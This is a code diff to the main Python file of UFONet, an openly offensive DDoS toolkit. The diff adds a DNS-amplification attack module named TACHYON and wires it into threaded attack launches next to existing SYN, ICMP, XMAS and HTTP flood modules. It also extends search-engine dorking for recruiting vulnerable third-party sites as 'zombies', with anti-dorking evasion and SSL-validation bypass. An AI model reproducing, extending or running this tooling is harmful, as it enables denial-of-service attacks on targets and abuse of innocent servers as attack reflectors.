@@ -1,7 +1,7 @@
 #!/usr/bin/env python 
 # -*- coding: utf-8 -*-"
 """
-UFONet - Denial of Service Toolkit - 2013/2018 - by psy (epsylon@riseup.net)
+UFONet - Denial of Service Toolkit - 2013/2019 - by psy (epsylon@riseup.net)
 
 You should have received a copy of the GNU General Public License along
 with UFONet; if not, write to the Free Software Foundation, Inc., 51
@@ -27,6 +27,7 @@ from core.mods.spray import SPRAY
 from core.mods.smurf import SMURF
 from core.mods.xmas import XMAS
 from core.mods.nuke import NUKE
+from core.mods.tachyon import TACHYON
 
 class UFONet(object):
     def __init__(self):
@@ -34,12 +35,12 @@ class UFONet(object):
         self.GIT_REPOSITORY = 'https://code.03c8.net/epsylon/ufonet' # oficial code source [OK! 22/12/2018]
         self.GIT_REPOSITORY2 = 'https://github.com/epsylon/ufonet' # mirror source [since: 04/06/2018]
         self.blackhole = '176.28.23.46' # default download/upload zombies [Blackhole] / Try [DIY] your own mirror
-        self.external_check_service1 = 'https://downforeveryoneorjustme.com/' # set external check service 1 [OK! 13/12/2018]
-        self.external_check_service2 = 'https://status.ws/' # set external check service 2 [OK! 13/12/2018]
+        self.external_check_service1 = 'https://downforeveryoneorjustme.com/' # set external check service 1 [OK! 28/02/2019]
+        self.external_check_service2 = 'https://status.ws/' # set external check service 2 [OK! 28/02/2019]
         self.check_tor_url = 'https://check.torproject.org/' # TOR status checking site
-        self.check_ip_service1 = 'https://checkip.dyndns.com/' # set external check ip service 1 [OK! 15/12/2018]
-        self.check_ip_service2 = 'https://whatismyip.org/' # set external check ip service 2 [OK! 15/12/2018]
-        self.check_ip_service3 = 'https://ip.42.pl/ra' # set external check ip service 3 [OK! 15/12/2018]
+        self.check_ip_service1 = 'https://checkip.dyndns.com/' # set external check ip service 1 [OK! 28/02/2019]
+        self.check_ip_service2 = 'https://whatismyip.org/' # set external check ip service 2 [OK! 28/02/2019]
+        self.check_ip_service3 = 'https://ip.42.pl/ra' # set external check ip service 3 [OK! 28/02/2019]
         self.agents_file = 'core/txt/user-agents.txt' # set source path to retrieve user-agents
         self.motherships_file = 'core/txt/motherships.txt' # set source path to retrieve mothership names
         self.zombies_file = 'botnet/zombies.txt' # set source path to retrieve [Zombies]
@@ -56,6 +57,8 @@ class UFONet(object):
         self.board_file = "server/board.txt" # set source path to retrieve [Blackhole] [Board]
         self.grid_file = "server/grid.txt" # set source path to retrieve [Blackhole] [Grid]
         self.wargames_file = "server/wargames.txt" # set source path to retrieve [Blackhole] [Wargames]
+        self.examples_file = "docs/examples.txt" # set source path to retrieve [Examples]
+        self.misc_file = "core/txt/misc.txt" # set source path to retrieve [Miscellania] cites
         self.referer = '' # black magic
         self.port = "8080" # default injection port
         self.mothershipname = "core/txt/shipname.txt"
@@ -88,6 +91,7 @@ class UFONet(object):
         self.total_smurf = 0
         self.total_xmas = 0
         self.total_nuke = 0
+        self.total_tachyon = 0
         self.total_zombies_failed_connection = 0
         self.ctx = ssl.create_default_context() # creating context to bypass SSL cert validation (black magic)
         self.ctx.check_hostname = False
@@ -142,22 +146,22 @@ class UFONet(object):
         print "                                             0===============================================0"
         print "                                             ||                                             ||"
         print "                    (00)                     ||  * Botnet -> [DDoS]:                        ||"
-        print "       (O)_  (O)   '----'   (O)  _(O)        ||                                             ||"   
-        print "           |  |.''.( xx ).''.|  |            ||      /Zombies : HTTP GET bots               ||"
-        print "           .'.'    |'..'|    '.'.            ||      /Droids  : HTTP GET (+params) bots     ||"
-        print "    .-.  .' /'--.__|_00_|__.--'\ '.  .-.     ||      /Aliens  : HTTP POST bots              ||"
-        print "   (O).)-| |  \  x |    |x   /  | |-(.(O)    ||      /UCAVs   : Web Abusing bots            ||"
-        print "    `-'  '-'-._'-./ ---- \.-'_.-'-'  `-'     ||      /X-RPCs  : XML-RPC bots                ||"
-        print "       _ | |   '-.___||___.-'   | | _        ||      /SPRAY   : TCP-SYN reflector           ||"
-        print "    .' _ | |   O |   __   | O   | | _ '.     ||      /SMURF   : ICMP echo flooder           ||"
-        print "   / .' ''.|  || | /_00_\ | ||  |.'' '. \    ||                                             ||"
-        print "   | '     |  =| | ###### | |=  |'      |    ||  * Close Combat -> [DoS]:                   ||"
-        print "   | |(0)| '.   \||__**_ ||/   .' |(0)| |    ||                                             ||"
+        print "       (O)_  (O)   '----'   (O)  _(O)        ||      /Zombies : HTTP GET bots               ||"   
+        print "           |  |.''.( xx ).''.|  |            ||      /Droids  : HTTP GET (+params) bots     ||"
+        print "           .'.'    |'..'|    '.'.            ||      /Aliens  : HTTP POST bots              ||"
+        print "    .-.  .' /'--.__|_00_|__.--'\ '.  .-.     ||      /UCAVs   : Web Abusing bots            ||"
+        print "   (O).)-|0|  \  x | ## |x   /  |0|-(.(O)    ||      /X-RPCs  : XML-RPC bots                ||"
+        print "    `-'  '-'-._'-./ -00- \.-'_.-'-'  `-'     ||      /DBSTRESS: HTTP DB attack              ||"
+        print "       _ | ||  '-.___||___.-'  || | _        ||      /SPRAY   : TCP-SYN reflector           ||"
+        print "    .' _ | ||==O |   __   | O==|| | _ '.     ||      /SMURF   : ICMP echo flooder           ||"
+        print "   / .' ''.|  || | /_00_\ | ||  |.'' '. \    ||      /TACHYON : DNS amplificator            ||"
+        print "   | '###  |  =| | ###### | |=  |' ###  |    ||                                             ||"
+        print "   | |(0)| '.  0\||__**_ ||/0  .' |(0)| |    ||  * Close Combat -> [DoS]:                   ||"
         print "   \ '._.'   '.  | \_##_/ |  .'   '._.' /    ||      /LOIC    : Fast HTTP requests          ||"
         print "    '.__ ____0_'.|__'--'__|.'_0____ __.'     ||      /LORIS   : Slow HTTP requests          ||"
         print "   .'_.-|                          |-._'.    ||      /UFOSYN  : TCP-SYN flooder             ||"
         print "                                             ||      /XMAS    : TCP-XMAS flooder            ||" 
-        print "   + Class: UFONet / ViPR404+ (model E) +    ||      /NUKE    : TCP-STARVATION attack       ||"
+        print "   + Class: UFONet / ViPR404+ (model F) +    ||      /NUKE    : TCP-STARVATION attack       ||"
         print "                                             ||                                             ||"
         print "                                             0|=============================================|0" 
         print ""
@@ -176,7 +180,9 @@ class UFONet(object):
         print '='*75
 
     def generate_exit_msg(self):
-        m = ["Oderint dum metuant!", "Ad susceptum perficiendum!", "Chao ab ordo!", "Obscuris vera involvens!", "Omnia mutantur, nihil interit!", "Orbis unum!", "Si vis pacem, para bellum!", "Homo homini lupus!", "Causa de timendi est nescire!", "Adhuc tempus!", "Iniqua nunquam regna perpetuo manent!", "Ab uno disce omnes!", "Unus pro omnibus, omnes pro uno!", "Age quod agis!", "Natalis solis invicti!", 'Donate BTC (Bitcoin) to keep UFONet (https://ufonet.03c8.net) strong!', 'Keep learning!', 'Freedom is not measured, freedom is enjoyed!', 'Cr4ck the syst3m!', 'Hack the Planet!', 'Thanks and good luck!']
+        f = open(self.misc_file)
+        m = f.readlines()
+        f.close()
         self.exit_msg = "Generating random exit... \n\n"
         self.exit_msg += " -> "+str(random.choice(m).strip()) 
 
@@ -257,10 +263,11 @@ class UFONet(object):
             self.agents.append(agent)
         self.user_agent = random.choice(self.agents).strip()
         self.search_engines = [] # available dorking search engines
-        self.search_engines.append('bing') # [30/12/2018: OK!]
-        self.search_engines.append('yahoo') # [30/12/2018: OK!]
+        self.search_engines.append('bing') # [28/02/2019: OK!]
+        self.search_engines.append('yahoo') # [28/02/2019: OK!]
+        self.search_engines.append('startpage') # [28/02/2019: OK!]
+        self.search_engines.append('duck') # [28/02/2019: OK!]
         #self.search_engines.append('yandex') # [03/02/2018: deprecated! -> captchasound]
-        #self.search_engines.append('duck') [09/08/2016: deprecated! -> duck has removed 'inurl' operator]
         #self.search_engines.append('google') # [09/08/2016: modified -> not working from TOR]
         if not os.path.exists("core/json/"): # create gui json cfg files folder
             os.mkdir("core/json/")
@@ -428,6 +435,15 @@ class UFONet(object):
             print "-"*35
             print '='*75, "\n"
 
+        # print some examples
+        if options.examples:
+            f = open(self.examples_file, 'r')
+            examples = f.readlines()
+            f.close()
+            self.banner()
+            for e in examples:
+                print e.strip('\n')
+
         # check EUID when running UFOSYN (root required for open 'raw sockets') / GUI will invoke 'sudo' directly
         if options.ufosyn:
             euid = self.checkeuid()
@@ -483,13 +499,24 @@ class UFONet(object):
                 except:
                     pass # keep running, but NUKE will fail
 
+        # check EUID when running TACHYON (root required)
+        if options.tachyon:
+            euid = self.checkeuid()
+            if euid != 0:
+                print("[Info] [AI] [Control] [TACHYON] (--tachyon) not started as root...\n")
+                try:
+                    args = ['sudo', sys.executable] + sys.argv + [os.environ]
+                    os.execlpe('sudo', *args)
+                except:
+                    pass # keep running, but TACHYON will fail
+
         # search for [Zombies] on search engines results (dorking)
         if options.search:
             zombies = []
             if options.engine:
                 engine = options.engine
             else:
-                engine = "yahoo" # default search engine
+                engine = "startpage" # default search engine
             try:
                 self.banner()
                 if not os.path.exists(self.humans_file) == True:
@@ -582,7 +609,7 @@ class UFONet(object):
                 print '='*62
                 print "\n- Victims found:", len(zombies_found), "\n"
                 print "    - Restored:", total_restored
-                print "    - Dorked:", len(zombies_found) - total_restored, "\n"
+                print "    - Dorked:", abs(len(zombies_found) - total_restored), "\n"
                 print '-'*32
                 print "\n- NEW possible zombies (NOT present in your army):", new_zombies, "\n"
                 print '='*62 + '\n'
@@ -628,7 +655,7 @@ class UFONet(object):
             if options.engine:
                 engine = options.engine
             else:
-                engine = "yahoo" # default search engine
+                engine = "startpage" # default search engine
             try:
                 dorks = self.extract_dorks()
                 if not dorks:
@@ -669,7 +696,7 @@ class UFONet(object):
                     for e in self.search_engines:
                         engine = e
                         print '='*44
-                        print("\n[AI] Searching for zombies using: "+engine+ " [from a list of [Dorks]]\n")
+                        print("\n[AI] Searching for zombies using: ["+engine+ "] from a list of [Dorks]\n")
                         print '='*44 + '\n'
                         self.options.engine = engine
                         for dork in dorks:
@@ -695,7 +722,7 @@ class UFONet(object):
                 else:
                     if restored:
                         print '='*44
-                    print("\n[AI] Searching for zombies using: "+engine+ " from a list of [Dorks]\n")
+                    print("\n[AI] Searching for zombies using: ["+ engine+ "] from a list of [Dorks]\n")
                     print '='*44 + '\n'
                     for dork in dorks:
                         print '='*22
@@ -1257,7 +1284,7 @@ class UFONet(object):
     def update_flying_stats(self):
         if not os.path.exists(self.mothership_stats_file) == True: # create data when no stats file (first time used)
             with open(self.mothership_stats_file, "w") as f:
-                json.dump({"flying": "0", "missions": "0", "scanner": "0", "transferred": "0", "max_chargo": "0", "completed": "0", "loic": "0", "loris": "0", "ufosyn": "0", "spray": "0", "smurf": "0", "xmas": "0", "nuke": "0", "crashed": "0"}, f, indent=4) # starting reset
+                json.dump({"flying": "0", "missions": "0", "scanner": "0", "transferred": "0", "max_chargo": "0", "completed": "0", "loic": "0", "loris": "0", "ufosyn": "0", "spray": "0", "smurf": "0", "xmas": "0", "nuke": "0", "tachyon": "0", "crashed": "0"}, f, indent=4) # starting reset
         stats_json_file = open(self.mothership_stats_file, "r")
         data = json.load(stats_json_file)
         stats_json_file.close()
@@ -1417,6 +1444,18 @@ class UFONet(object):
         anuke = str(int(anuke) + 1) # add new nuke attack to recorded stats
         self.total_nuke = self.total_nuke + 1 # add new nuke attack to session stats
         data["nuke"] = anuke
+        stats_json_file = open(self.mothership_stats_file, "w+")
+        stats_json_file.write(json.dumps(data))
+        stats_json_file.close()
+
+    def update_tachyon_stats(self):
+        stats_json_file = open(self.mothership_stats_file, "r")
+        data = json.load(stats_json_file)
+        stats_json_file.close()
+        atachyon = data["tachyon"]
+        atachyon = str(int(atachyon) + 1) # add new tachyon attack to recorded stats
+        self.total_tachyon = self.total_tachyon + 1 # add new tachyon attack to session stats
+        data["tachyon"] = atachyon
         stats_json_file = open(self.mothership_stats_file, "w+")
         stats_json_file.write(json.dumps(data))
         stats_json_file.close()
@@ -2106,8 +2145,8 @@ class UFONet(object):
         options = self.options
         zombies = []
         if not options.engine: # default search engine
-            options.engine = 'yahoo'
-        if options.engine == 'bing': # using bing [13/12/2018: OK!]
+            options.engine = 'startpage'
+        if options.engine == 'bing': # using bing [28/02/2019: OK!]
             url = 'https://www.bing.com/search?'
             if options.search: # search from query
                 q = 'instreamset:(url):"' + str(options.search) + '"' # set query to search literally on results
@@ -2142,22 +2181,31 @@ class UFONet(object):
                     for e in self.search_engines:
                         print "+ "+e
                     print '-'*25
-                    print "\nEx: ufonet -s 'proxy.php?url=' --se 'yahoo'"
+                    print "\nEx: ufonet -s 'proxy.php?url=' --se 'startpage'"
                     return #sys.exit(2)
                 else:
                     req_reply = ''
             regex = '<li class="b_algo"><h2><a href="(.+?)">' # regex magics
             pattern = re.compile(regex)
             url_links = re.findall(pattern, req_reply)
-        elif options.engine == 'yahoo': # yahoo [13/12/2018: OK!]
-            #location = ['fr', 'de', 'es', 'nl', 'it', 'se', 'ch', 'jp', 'ru', 'lt'] # generate 'flags' for location servers to evade Yahoo anti-dorking on main search webpage [grey magic: 18/08/2016]
-            location = ['fr', 'de', 'es', 'nl', 'se', 'ch', 'ru'] # [08/04/2017]
+        elif options.engine == 'yahoo': # yahoo [28/02/2019: OK!]
+            location = ['fr', 'de', 'es', 'nl', 'it', 'se', 'ch', 'jp', 'ru', 'lt'] # evading Yahoo anti-dorking [grey magic: 28/02/2019]
+            #location = ['fr', 'de', 'es', 'nl', 'se', 'ch', 'ru'] # [08/04/2017]
             location = str(random.choice(location).strip()) # shuffle location
-            url = 'https://'+location+'.search.yahoo.com/search?'
+            if location == "jp": # [28/02/2019]
+                url = 'https://search.yahoo.co.jp/search?'
+            else:
+                url = 'https://'+location+'.search.yahoo.com/search?'            
             if options.search: # search from query
-                q = 'instreamset:(url):"' + str(options.search) + '"' # set query to search literally on results
+                if location == "jp":
+                    q = '"' + str(options.search) + '"' # set query to search literally on results
+                else:
+                    q = 'instreamset:(url):"' + str(options.search) + '"' # set query to search literally on results
             if options.dorks or options.autosearch: # search from a dork
-                q = 'instreamset:(url):"' + str(dork) + '"' # set query from a dork to search literally on results
+                if location == "jp":
+                    q = '"' + str(dork) + '"' # set query to search literally on results
+                else:
+                    q = 'instreamset:(url):"' + str(dork) + '"' # set query from a dork to search literally on results
             start = 0 # set index number of first entry
             query_string = { 'p':q, 'b':start }
             data = urllib.urlencode(query_string)
@@ -2195,6 +2243,86 @@ class UFONet(object):
             regex = 'href="(.+?)" target="_blank" data' # regex magics [08/04/2017]
             pattern = re.compile(regex)
             url_links = re.findall(pattern, req_reply)
+        elif options.engine == 'startpage': # startpage [28/02/2019: OK!]
+            url = 'https://www.startpage.com/do/asearch'
+            if options.search: # search from query
+                q = 'url:"' + str(options.search) + '"' # set query to search literally on results
+            if options.dorks or options.autosearch: # search from a dork
+                q = 'url:"' + str(dork) + '"' # set query from a dork to search literally on results
+            query_string = { 'cmd':'process_search', 'query':q }
+            data = urllib.urlencode(query_string)
+            self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
+            headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
+            if options.verbose:
+                print("Query used: " + url + " (POST: "+ data + ")\n")
+            try:
+                if options.proxy: # set proxy
+                    self.proxy_transport(options.proxy)
+                req = urllib2.Request(url, data, headers) # HTTP POST request
+                req_reply = urllib2.urlopen(req, context=self.ctx).read()
+            except:
+                print('[Error] [AI] Unable to connect to: startpage\n')
+                if options.allengines or options.autosearch:
+                    return
+                if not options.dorks or not options.autosearch:
+                    if not self.options.forceyes:
+                        update_reply = raw_input("[AI] Do you want to try a different search engine? (Y/n)")
+                    else:
+                        update_reply = "Y"
+                    if update_reply == "n" or update_reply == "N":
+                        return #sys.exit(2)
+                    print "\nSearch engines available:"
+                    print '-'*25
+                    for e in self.search_engines:
+                        print "+ "+e
+                    print '-'*25
+                    print "\nEx: ufonet -s 'proxy.php?url=' --se 'yahoo'"
+                    return #sys.exit(2)
+                else:
+                    req_reply = ''
+            regex = 'href="(.+?)"  target="_blank"  rel' # regex magics [08/04/2017]
+            pattern = re.compile(regex)
+            url_links = re.findall(pattern, req_reply)
+        elif options.engine == 'duck': # using duckduckgo [28/02/2019: OK!]
+            url = 'https://duckduckgo.com/html/'
+            if options.search: # search from query
+                q = 'instreamset:(url):"' + str(options.search) + '"' # set query to search literally on results
+            if options.dorks or options.autosearch: # search from a dork
+                q = 'instreamset:(url):"' + str(dork) + '"' # set query from a dork to search literally on results
+            query_string = { 'q':q }
+            data = urllib.urlencode(query_string)
+            self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
+            headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
+            if options.verbose:
+                print("Query used: " + url + " (POST: "+ data + ")\n")
+            try:
+                if options.proxy: # set proxy
+                    self.proxy_transport(options.proxy)
+                req = urllib2.Request(url, data, headers) # HTTP POST request
+                req_reply = urllib2.urlopen(req, context=self.ctx).read()
+            except:
+                print('[Error] [AI] Unable to connect to: duck\n')
+                if options.allengines or options.autosearch:
+                    return
+                if not options.dorks or not options.autosearch:
+                    if not self.options.forceyes:
+                        update_reply = raw_input("[AI] Do you want to try a different search engine? (Y/n)")
+                    else:
+                        update_reply = "Y"
+                    if update_reply == "n" or update_reply == "N":
+                        return #sys.exit(2)
+                    print "\nSearch engines available:"
+                    print '-'*25
+                    for e in self.search_engines:
+                        print "+ "+e
+                    print '-'*25
+                    print "\nEx: ufonet -s 'proxy.php?url=' --se 'startpage'"
+                    return #sys.exit(2)
+                else:
+                    req_reply = ''
+            regex = 'snippet" href="(.+?)">' # regex magics
+            pattern = re.compile(regex)
+            url_links = re.findall(pattern, req_reply)
         else: # no valid search engine
             print('[Error] [AI] This search engine is not supported!\n')
             if not options.dorks or options.autosearch:
@@ -2209,7 +2337,7 @@ class UFONet(object):
                 for e in self.search_engines:
                     print "+ "+e
                 print '-'*25
-                print "\nEx: ufonet -s 'proxy.php?url=' --se 'bing'"
+                print "\nEx: ufonet -s 'proxy.php?url=' --se 'yahoo'"
                 return #sys.exit(2)
             else:
                 req_reply = ''
@@ -2217,7 +2345,7 @@ class UFONet(object):
             try:
                 num = int(options.num_results)
             except:
-                print("You should specify an integer!!!. Using default value: 10\n")
+                print("[Info] [AI] You should specify an integer!... Using default value: 10\n")
                 num = 10
         else:
             num = 10
@@ -3596,7 +3724,7 @@ class UFONet(object):
         else:
             print "\n[Error] [AI] Target not valid: "+target+" -> [Discarding!]\n"
 
-    def aiming_extra_weapons(self, target, proxy, loic, loris, ufosyn, spray, smurf, xmas, nuke):
+    def aiming_extra_weapons(self, target, proxy, loic, loris, ufosyn, spray, smurf, xmas, nuke, tachyon):
         # perform some other extra attacks (such as DoS techniques)
         time.sleep(2) # aiming (multi-threading flow time compensation)
         if loic:
@@ -3610,7 +3738,7 @@ class UFONet(object):
             t = threading.Thread(target=self.instance.attacking, args=(target, self.options.loic, proxy)) # LOIC using threads + proxy
             t.daemon = True # extra weapons are threaded as daemons
             t.start()
-            self.update_loic_stats() # add new LOIC attack to mothership
+            self.update_loic_stats() # add new LOIC attack to mothership stats
         if loris:
             try:
                 self.options.loris = int(loris)
@@ -3622,7 +3750,7 @@ class UFONet(object):
             t2 = threading.Thread(target=self.instance.attacking, args=(target, self.options.loris)) # LORIS using threads
             t2.daemon = True
             t2.start()
-            self.update_loris_stats() # add new LORIS attack to mothership
+            self.update_loris_stats() # add new LORIS attack to mothership stats
         if ufosyn:
             try:
                 self.options.ufosyn = int(ufosyn)
@@ -3634,7 +3762,7 @@ class UFONet(object):
             t3 = threading.Thread(target=self.instance.attacking, args=(target, self.options.ufosyn)) # UFOSYN using threads
             t3.daemon = True
             t3.start()
-            self.update_ufosyn_stats() # add new UFOSYN attack to mothership
+            self.update_ufosyn_stats() # add new UFOSYN attack to mothership stats
         if spray:
             try:
                 self.options.spray = int(spray)
@@ -3646,7 +3774,7 @@ class UFONet(object):
             t4 = threading.Thread(target=self.instance.attacking, args=(target, self.options.spray)) # SPRAY using threads
             t4.daemon = True
             t4.start()
-            self.update_spray_stats() # add new SPRAY attack to mothership
+            self.update_spray_stats() # add new SPRAY attack to mothership stats
         if smurf:
             try:
                 self.options.smurf = int(smurf)
@@ -3658,7 +3786,7 @@ class UFONet(object):
             t5 = threading.Thread(target=self.instance.attacking, args=(target, self.options.smurf)) # SMURF using threads
             t5.daemon = True
             t5.start()
-            self.update_smurf_stats() # add new SMURF attack to mothership
+            self.update_smurf_stats() # add new SMURF attack to mothership stats
         if xmas:
             try:
                 self.options.xmas = int(xmas)
@@ -3670,7 +3798,7 @@ class UFONet(object):
             t6 = threading.Thread(target=self.instance.attacking, args=(target, self.options.xmas)) # XMAS using threads
             t6.daemon = True
             t6.start()
-            self.update_xmas_stats() # add new XMAS attack to mothership
+            self.update_xmas_stats() # add new XMAS attack to mothership stats
         if nuke:
             if sys.platform == "linux" or sys.platform == "linux2":
                 try:
@@ -3680,12 +3808,24 @@ class UFONet(object):
                 if self.options.nuke < 1:
                     self.options.nuke = 10000
                 self.instance = NUKE() # instance main class for NUKE operations
-                t = threading.Thread(target=self.instance.attacking, args=(target, self.options.nuke)) # NUKE using threads
-                t.daemon = True # extra weapons are threaded as daemons
-                t.start()
-                self.update_nuke_stats() # add new NUKE attack to mothership
+                t7 = threading.Thread(target=self.instance.attacking, args=(target, self.options.nuke)) # NUKE using threads
+                t7.daemon = True # extra weapons are threaded as daemons
+                t7.start()
+                self.update_nuke_stats() # add new NUKE attack to mothership stats
             else:
                 print "\n[Info] [AI] Your OS cannot perform this attack... -> [Passing!]\n"
+        if tachyon:
+            try:
+                self.options.tachyon = int(tachyon)
+            except:
+                self.options.tachyon = 1000 # default TACHYON requests
+            if self.options.tachyon < 1:
+                self.options.tachyon = 1000
+            self.instance = TACHYON() # instance main class for TACHYON operations
+            t8 = threading.Thread(target=self.instance.attacking, args=(target, self.options.tachyon)) # TACHYON using threads
+            t8.daemon = True
+            t8.start()
+            self.update_tachyon_stats() # add new TACHYON attack to mothership stats
 
     def stressing(self, target, zombie):
         # perform a DDoS Web attack against a target, requesting records on target's database
@@ -3887,14 +4027,14 @@ class UFONet(object):
             if not self.options.forceyes: 
                 if not options.attackme:
                     if not options.disablehead:
-                        start_reply = raw_input("[AI] Target is ONLINE!. Do you want to start an attack? (y/N)\n")
+                        start_reply = raw_input("\n[AI] Target is ONLINE!. Do you want to start an attack? (y/N)\n")
                     else:
-                        start_reply = raw_input("[AI] Do you want to start an attack, directly? (y/N)\n")
+                        start_reply = raw_input("\n[AI] Do you want to start an attack, directly? (y/N)\n")
                 else:
                     if not options.disablehead:
-                        start_reply = raw_input("[AI] Mothership is READY!. Do you want to start an attack 'against yourself'? (y/N)\n")
+                        start_reply = raw_input("\n[AI] Mothership is READY!. Do you want to start an attack 'against yourself'? (y/N)\n")
                     else:
-                        start_reply = raw_input("[AI] Do you want to start an attack 'against yourself', directly? (y/N)\n")
+                        start_reply = raw_input("\n[AI] Do you want to start an attack 'against yourself', directly? (y/N)\n")
             else:
                 start_reply = "Y"
             if start_reply == "y" or start_reply == "Y":
@@ -3909,8 +4049,8 @@ class UFONet(object):
                 num_hits = 0
                 num_zombie = 1
                 # start to attack the target with [MODS]
-                if options.loic or options.loris or options.ufosyn or options.spray or options.smurf or options.xmas or options.nuke:
-                    ex = threading.Thread(target=self.aiming_extra_weapons, args=(target, self.options.proxy, self.options.loic, self.options.loris, self.options.ufosyn, self.options.spray, self.options.smurf, self.options.xmas, self.options.nuke)) # multithreading flow for extra attacks
+                if options.loic or options.loris or options.ufosyn or options.spray or options.smurf or options.xmas or options.nuke or options.tachyon:
+                    ex = threading.Thread(target=self.aiming_extra_weapons, args=(target, self.options.proxy, self.options.loic, self.options.loris, self.options.ufosyn, self.options.spray, self.options.smurf, self.options.xmas, self.options.nuke, self.options.tachyon)) # multithreading flow for extra attacks
                     ex.daemon = True # extra weapons are threaded as daemons
                     ex.start()
                 # start to attack the target with [ARMY]
